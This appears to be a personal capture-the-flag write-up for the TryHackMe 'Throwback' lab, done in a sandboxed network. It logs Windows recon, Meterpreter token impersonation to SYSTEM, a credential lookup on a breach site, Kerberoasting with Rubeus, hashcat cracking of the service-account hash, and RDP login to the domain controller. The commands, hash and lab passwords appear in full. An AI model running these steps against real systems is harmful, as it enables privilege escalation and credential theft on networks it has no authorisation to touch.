# recon
```
*Evil-WinRM* PS C:\Users\daviesj\Desktop> systeminfo
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.243:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.243:5985-<><>-OK

Host Name:                 CORP-ADT01
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19041 N/A Build 19041
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          BlaireJ
Registered Organization:
Product ID:                00330-81487-50620-AA417
Original Install Date:     6/28/2020, 2:20:54 PM
System Boot Time:          11/8/2020, 4:28:47 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,058 MB
Virtual Memory: Max Size:  4,800 MB
Virtual Memory: Available: 3,853 MB
Virtual Memory: In Use:    947 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    corporate.local
Logon Server:              N/A
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB4569745
                           [02]: KB4537759
                           [03]: KB4557968
                           [04]: KB4561600
                           [05]: KB4566785
                           [06]: KB4570334
                           [07]: KB4566782
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.11.1
                                 IP address(es)
                                 [01]: 10.200.11.243
                                 [02]: fe80::c819:ce04:18c9:77b1
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
- users
```
*Evil-WinRM* PS C:\Users\daviesj\Desktop> ls ../../


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/24/2020   7:40 PM                BlaireJ
d-----         8/25/2020   3:43 PM                daviesj
d-----         8/25/2020   2:40 PM                dosierk
d-r---         6/28/2020   3:31 PM                Public
```
After I moving around, I found out that the admin user should be `dosierk` since I do not have premission to read his directory.


- AV: it is disable
```
*Evil-WinRM* PS C:\Users> Get-MpComputerStatus
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.243:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.243:5985-
<><>-OK


AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.18.2008.7
AMRunningMode                   : Normal
AMServiceEnabled                : True
AMServiceVersion                : 4.18.2008.7
AntispywareEnabled              : True
AntispywareSignatureAge         : 74
AntispywareSignatureLastUpdated : 8/25/2020 8:47:10 AM
AntispywareSignatureVersion     : 1.321.2188.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 74
AntivirusSignatureLastUpdated   : 8/25/2020 8:47:11 AM
AntivirusSignatureVersion       : 1.321.2188.0
BehaviorMonitorEnabled          : False
ComputerID                      : F3AC67B1-B314-428E-8C14-8366B6CCB07C
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
IsTamperProtected               : False
IsVirtualMachine                : True
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 0
QuickScanEndTime                : 11/7/2020 12:57:58 PM
QuickScanStartTime              : 11/7/2020 12:57:26 PM
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :
```
## DNS
```
*Evil-WinRM* PS C:\Users\MercerH\Documents> Resolve-DNsName 10.200.11.79
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.118:5985-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.11.118:5985-<><>-OK

Name                           Type   TTL   Section    NameHost
----                           ----   ---   -------    --------
79.11.200.10.in-addr.arpa.     PTR    1200  Question   TBSEC-DC01
```



# priv esc abusing token.
```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
CORPORATE\DaviesJ
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
CORPORATE\DosierK

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

```
meterpreter > ls
Listing: C:\Users\dosierk\Documents
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2020-07-30 23:01:14 -0400  My Music
40777/rwxrwxrwx   0     dir   2020-07-30 23:01:14 -0400  My Pictures
40777/rwxrwxrwx   0     dir   2020-07-30 23:01:14 -0400  My Videos
100666/rw-rw-rw-  402   fil   2020-07-31 00:15:02 -0400  desktop.ini
100666/rw-rw-rw-  1022  fil   2020-07-31 00:37:56 -0400  email_update.txt

meterpreter > cat email_update.txt 
Hey team! Hope you guys are having a good day!

As all of you probably already now we are transferring to our new email service as we
transition please use the new emails provided to you as well as the default credentials
that can be found within your emails.

Please do not use these emails outside of corporate as they contain sensitive information.

The new email format is based on what department you are in:

ESM-Example@TBHSecurity.com
FIN-Example@TBHSecurity.com
HRE-Example@TBHSecurity.com
ITS-Example@TBHSecurity.com
SEC-Example@TBHSecurity.com

In order to access your email you will need to go to mail.corporate.local as we get our 
servers moved over.

If you do not already have mail.corporate.local set in your hosts file please reach out to
IT to get that fixed.

Please remain patient as we make this transition and please feel free to email me with any
questions you may have regarding the new transition: HRE-KDoiser@TBHSecurity.com

Karen Dosier,
Human Relations Consulatant
meterpreter > 
```

# accessing mail.corporate.local + www.breachgtfo.local
base on the infomation we gathered
- `server_updated.txt`: `If you have not already please add 10.200.x.232 to your hosts file in order to access these resources.`
- `email_update.txt`: `If you do not already have mail.corporate.local set in your hosts file please`

so our plan is add `10.200.11.232 mail.corporate.local` to our `/etc/host`. After readin THM, I found out that we need to add `10.200.11.232 www.breachgtfo.local` too.
```console
└─$ sudo -i                                         
[sudo] password for kali: 
root@kali:~# echo "10.200.11.232 mail.corporate.local" >> /etc/hosts
root@kali:~# echo "10.200.11.232 www.breachgtfo.local" >> /etc/hosts
```
at this point, you should be able to access both sites.


```console
$ python3 namely.py -nf ~/THM/throwback/names.txt -d TBHSecurity.com -t  XXX-\${first1}\${last}@\${domain} >> ~/THM/throwback/emails.txt
```
where XXX is the departments.

```console
kali@kali:~/THM/throwback$ cat emails.txt 
HRE-JStewart@TBHSecurity.com
HRE-SWinters@TBHSecurity.com
HRE-RFoxx@TBHSecurity.com
ESM-JStewart@TBHSecurity.com
ESM-SWinters@TBHSecurity.com
ESM-RFoxx@TBHSecurity.com
FIN-JStewart@TBHSecurity.com
FIN-SWinters@TBHSecurity.com
FIN-RFoxx@TBHSecurity.com
ITS-JStewart@TBHSecurity.com
ITS-SWinters@TBHSecurity.com
ITS-RFoxx@TBHSecurity.com
SEC-JStewart@TBHSecurity.com
SEC-SWinters@TBHSecurity.com
SEC-RFoxx@TBHSecurity.com
```
on the `www.breachgtfo.local` let insert the email one by one, let hope for the best! may the force be with you.....


and **Boom**!!
```
1 results

Email: SEC-JStewart@TBHSecurity.com
Password: aqAwM53cW8AgRbfr
Username: JStewart
Data Breach: pwnDB
```
looking for flag? check the source code. now let log into the mail server using `JStewart` credential. this is what I found:
```
Hello Jeff Stewart, and welcome to Throwback Hacks Security!

As I'm sure you've already been informed, you may not have access to your network user account for a few days while IT finishes getting everything setup. In the meantime, you're able to use the Guest Account. You can access the account with the following credentials:

TBSEC_GUEST:WelcomeTBSEC1!

Note: The guest account is heavily monitored and will be deactivated as soon as your account up and running!

Thank you for your patience,

BoJack Horseman,
Information Technology Specailist
```
I dunno if we should use `TBSEC_GUEST:WelcomeTBSEC1!` since `the guest account is heavily monitored`... 

# foothold on TBSEC-DC01
```
$ proxychains evil-winrm -i 10.200.11.79 -u "TBSEC_GUEST" -p WelcomeTBSEC1!                      1 ⨯
ProxyChains-3.1 (http://proxychains.sf.net)
```


proxychains xfreerdp /u:'TBSEC_GUEST' /p:'WelcomeTBSEC1!' /v:10.200.11.79

proxychains xfreerdp /u:'TBSEC_GUEST' /p:'WelcomeTBSEC1!' /v:10.200.11.79

did not works
# abuse Kerberos with Rubeus
read more about Rubeus [here](https://github.com/GhostPack/Rubeus)
1. search for Rubeus.
2. instert cmd `kerberoast`
3. select agent with root priv
4. run and wait for the result.
```
(empireadmin) function Invoke-Rubeus
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandator 
 
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Found 1 user(s) to Kerberoast!

[*] SamAccountName         : TBService
[*] DistinguishedName      : CN=TBService,OU=Quarantine,DC=TBSECURITY,DC=local
[*] ServicePrincipalName   : TBSEC-DC01/TBService.TBSECURITY.local:48064
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*TBService$TBSECURITY.local$TBSEC-DC01/TBService.TBSECURITY.local:48
                             064*$660852D069FDB89EEB1C338DC29D02F7$5452D32F93EBE5BAC9E7BABD96C37CD8EA866E12B3
                             A7867A92653CAECACD6E7C09F4AFAF86B277DAF0CF038EC21505EBA484C22237E888778768D13433
                             A848F42D3AA78C249548B4B84DCC60CE9A0A7C43DFAE4066F2C73A7D62423FA0087DBD60891693D9
                             9CC85D79DF1FE139239A62F57E10A52FE34582101BC6175CEC5D833CFF1159B38A63092E2AA90791
                             2ADBDABE92DE250B5070A3EE29169F492D66E0444E18442C40994DC9C138617ECFACB8F3E88979C9
                             BD1D36254932D7521F7CD12FFF5777A6B6845E569C43CE5CF62FED791492546768270392832B23F5
                             35B758C6E2867328C6556083408F09EFD95476A3FF63FCAC0AD165E792E6284A57270E0DA38BFD1A
                             3892309781B3647647045DEC0FC4356ACAF48FA122F2C326FB85C48513398408F39F17233A4D48C3
                             025CAA41E514017009FB7977A2EB8FB3D656A4FE98EEEA0C7FF2451997206F73F7BD8A50FB29EC2E
                             CA7CE84719ED58160DC30C1F33AF7CCEA6FB83CF190A0BFE6DFB346FB57EC7AA7FA6D9B34BE68A6C
                             32DC01BAE7D7630A88EF3BC71CD30998FFC58CA78FE8B750141EDD6BA0E95080747327C78C2F6BEA
                             0359FF23DCB55B881353D7D6CECE2A6EDA3363EA6BD81E92570C579314A2509B77B54A7A8038CEB0
                             9045D8B78F668C7F037C3C02F635C1C1347B0D80923C88C8A0DB3B97860EA36BD8877A930A2DD1C7
                             69468F52125608DE64932968BF943BA7C807EB48E8107B7FAC2115BB52BA5F258D02EC3B4697C225
                             000E434664DF95E924235609C14064D1CA19C24475A948EFED1FE6925A746CBF5FD2C922A207C5D1
                             51EA3226D1097C1B4EECDC643305B5A2CA1EDEEDE72C6C1FA56556B6CE4997A6829672379611817A
                             17422D234DFBF6A9A36CCD6AB0B4133FED0BE55D0E52810596343AB78E840052385303DBD37F286D
                             A77167F9F8F5F6555759E4F3EDF7CFD4FDC8E8C89DF1E4E0EA67C946488819D7DF4ACB917A239C13
                             5EE337698D0374A9EE13E5331322519C2E58046FC3A8AE58E5A9A27207DDE3766F4606720D5F53AB
                             E790B6589146BB36044D0AFD74A20F8024161AF30575533E0DDA97132D6C7651BD6826B4544915B6
                             62E01DC0A93B4498ECDEE7177BB3DAD38BAF36695E4C3169B23901ACE74AAFFB67848C4F2E994ED2
                             BCADF3985779E7EC334AC4EA0EF096DC7E7B159C19F1C0BA6033B9A1328E3625F681A6D822F46989
                             3CC70DFB18C058B09C495111BFB1A0F0154FE8EEAAD59C74582A43479CB35F75E1524AF2ADFC99F2
                             655165C7E4CA3775CCCBC1D6E9547F823BB456CABB892CCC4168AA94251F427B75D96DD92BEDFC24
                             8CA37DB15C3EB8576D717651320E9234C7C607A67F797CD2B8B90F3E8D6F78284EE2702854AD0105
                             59A6B2BBFFD127E492CBC8B2330C4A43BDB519BDDF1DD3FFAB6407ADCB6435A155B07948EEC1655E
                             A2591BBAE677E1A9C6680D90C621DC2AA7E687060704984A32A615208472B0A697DD27044250D250
                             9951314B9BBE126CB0FA83ED94312E8917E6F0B472D05D153FCC47E3AAB433B986
```
clean
```
$krb5tgs$23$*TBService$TBSECURITY.local$TBSEC-DC01/TBService.TBSECURITY.local:48064*$660852D069FDB89EEB1C338DC29D02F7$5452D32F93EBE5BAC9E7BABD96C37CD8EA866E12B3A7867A92653CAECACD6E7C09F4AFAF86B277DAF0CF038EC21505EBA484C22237E888778768D13433A848F42D3AA78C249548B4B84DCC60CE9A0A7C43DFAE4066F2C73A7D62423FA0087DBD60891693D99CC85D79DF1FE139239A62F57E10A52FE34582101BC6175CEC5D833CFF1159B38A63092E2AA907912ADBDABE92DE250B5070A3EE29169F492D66E0444E18442C40994DC9C138617ECFACB8F3E88979C9BD1D36254932D7521F7CD12FFF5777A6B6845E569C43CE5CF62FED791492546768270392832B23F535B758C6E2867328C6556083408F09EFD95476A3FF63FCAC0AD165E792E6284A57270E0DA38BFD1A3892309781B3647647045DEC0FC4356ACAF48FA122F2C326FB85C48513398408F39F17233A4D48C3025CAA41E514017009FB7977A2EB8FB3D656A4FE98EEEA0C7FF2451997206F73F7BD8A50FB29EC2ECA7CE84719ED58160DC30C1F33AF7CCEA6FB83CF190A0BFE6DFB346FB57EC7AA7FA6D9B34BE68A6C32DC01BAE7D7630A88EF3BC71CD30998FFC58CA78FE8B750141EDD6BA0E95080747327C78C2F6BEA0359FF23DCB55B881353D7D6CECE2A6EDA3363EA6BD81E92570C579314A2509B77B54A7A8038CEB09045D8B78F668C7F037C3C02F635C1C1347B0D80923C88C8A0DB3B97860EA36BD8877A930A2DD1C769468F52125608DE64932968BF943BA7C807EB48E8107B7FAC2115BB52BA5F258D02EC3B4697C225000E434664DF95E924235609C14064D1CA19C24475A948EFED1FE6925A746CBF5FD2C922A207C5D151EA3226D1097C1B4EECDC643305B5A2CA1EDEEDE72C6C1FA56556B6CE4997A6829672379611817A17422D234DFBF6A9A36CCD6AB0B4133FED0BE55D0E52810596343AB78E840052385303DBD37F286DA77167F9F8F5F6555759E4F3EDF7CFD4FDC8E8C89DF1E4E0EA67C946488819D7DF4ACB917A239C135EE337698D0374A9EE13E5331322519C2E58046FC3A8AE58E5A9A27207DDE3766F4606720D5F53ABE790B6589146BB36044D0AFD74A20F8024161AF30575533E0DDA97132D6C7651BD6826B4544915B662E01DC0A93B4498ECDEE7177BB3DAD38BAF36695E4C3169B23901ACE74AAFFB67848C4F2E994ED2BCADF3985779E7EC334AC4EA0EF096DC7E7B159C19F1C0BA6033B9A1328E3625F681A6D822F469893CC70DFB18C058B09C495111BFB1A0F0154FE8EEAAD59C74582A43479CB35F75E1524AF2ADFC99F2655165C7E4CA3775CCCBC1D6E9547F823BB456CABB892CCC4168AA94251F427B75D96DD92BEDFC248CA37DB15C3EB8576D717651320E9234C7C607A67F797CD2B8B90F3E8D6F78284EE2702854AD010559A6B2BBFFD127E492CBC8B2330C4A43BDB519BDDF1DD3FFAB6407ADCB6435A155B07948EEC1655EA2591BBAE677E1A9C6680D90C621DC2AA7E687060704984A32A615208472B0A697DD27044250D2509951314B9BBE126CB0FA83ED94312E8917E6F0B472D05D153FCC47E3AAB433B986
```

hashcat -m 13100 -a 0 tbservice.txt rockyou.txt -o cracked.txt

-r OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule -o cracked.txt

hashcat -a 0 -m 13100 tbservice.txt rockyou.txt -r OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule -o cracked.txt

now go an grab the root flag

securityadmin284650

└─$ proxychains xfreerdp /u:'TBService' /p:'securityadmin284650' /v:10.200.11.79  